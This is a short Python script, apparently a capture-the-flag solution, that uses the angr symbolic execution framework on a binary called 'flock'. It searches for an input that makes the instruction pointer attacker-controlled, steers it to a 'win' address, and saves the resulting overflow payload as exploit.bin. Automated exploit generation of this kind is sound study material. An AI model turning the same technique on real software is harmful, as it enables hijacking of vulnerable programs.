import angr

proj = angr.Project('./flock')

simgr = proj.factory.simgr()

while len(simgr.active) > 0 and len(simgr.unconstrained) == 0:
    simgr.step()

print(simgr)

if simgr.unconstrained:
    print("Crashing input:")
    print(simgr.unconstrained[0].posix.dumps(0))

    state = simgr.unconstrained[0].copy()
    state.add_constraints(state.regs.rip == 0x4011b9) # win
    assert state.satisfiable()

    payload = state.posix.dumps(0)
    print("Exploit payload:")
    print(payload)

    with open('exploit.bin', 'wb') as f:
        f.write(payload)
else:
    print("no unconstrained states")
